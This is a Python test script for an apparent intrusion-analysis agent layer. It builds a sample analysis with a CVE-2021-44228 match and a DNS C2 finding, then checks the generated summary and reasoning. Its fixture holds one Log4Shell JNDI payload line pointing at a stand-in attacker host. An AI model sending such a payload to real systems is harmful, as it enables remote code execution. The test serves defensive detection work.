from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.agent.orchestrator import run_agent_layer


def main() -> None:
    analysis = {
        "structured_events": [
            {"event_id": "pkt-1", "protocol": "HTTP"},
            {"event_id": "pkt-2", "protocol": "DNS"},
        ],
        "top_cves": [
            {
                "cve": "CVE-2021-44228",
                "score": 0.91,
                "rule_confirmed": True,
                "signals": ["log4shell_jndi"],
                "event_ids": ["pkt-1"],
                "label_votes": {"CVE-2021-44228": 2},
                "evidence_details": [
                    {
                        "event_id": "pkt-1",
                        "neighbor_id": "demo-log4shell",
                        "neighbor_payload": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
                        "neighbor_labels": ["CVE-2021-44228"],
                    }
                ],
            }
        ],
        "attack_timeline": [
            {"event_id": "pkt-1", "timestamp": 1.0},
            {"event_id": "pkt-2", "timestamp": 2.0},
        ],
        "attack_chain": [
            {
                "stage": "Exploitation",
                "confidence": "high",
                "evidence_ids": ["pkt-1"],
            }
        ],
        "c2_findings": [
            {
                "c2_type": "DNS C2 / Tunneling",
                "confidence": "high",
                "dst_ip": "198.51.100.53",
                "dst_port": 53,
                "evidence_ids": ["pkt-2"],
            }
        ],
        "impact_assessment": {
            "verdict": "Possible successful exploitation with C2 indicators",
            "confidence": "medium",
            "reasoning": "Suspicious C2/beacon communication was detected with exploit-related traffic or CVE evidence.",
            "evidence_ids": ["pkt-1", "pkt-2"],
        },
    }

    result = run_agent_layer(analysis)
    assert result["schema_version"] == "agent-v1"
    assert result["mode"] == "deterministic"
    assert "Possible successful exploitation with C2 indicators" in result["executive_summary"]
    assert "CVE-2021-44228" in result["executive_summary"]
    assert any("C2 indicators" in item for item in result["key_findings"])
    assert result["confidence_summary"]["high"] >= 1
    assert any(item["evidence_id"] == "pkt-1" and "demo-log4shell" in item["related"] for item in result["evidence_pack"])
    assert any(item["evidence_id"] == "pkt-2" and "DNS C2 / Tunneling" in item["related"] for item in result["evidence_pack"])
    assert len(result["agent_reasoning"]) == 4
    vuln_reasoning = [item for item in result["agent_reasoning"] if item["agent"] == "Vulnerability Judge Agent"][0]
    assert "pkt-1" in vuln_reasoning["evidence_ids"]
    assert "demo-log4shell" in vuln_reasoning["reasoning"]
    assert "CVE-2021-44228=2" in vuln_reasoning["reasoning"]
    assert any("198.51.100.53:53" in item for item in result["next_actions"])


if __name__ == "__main__":
    main()
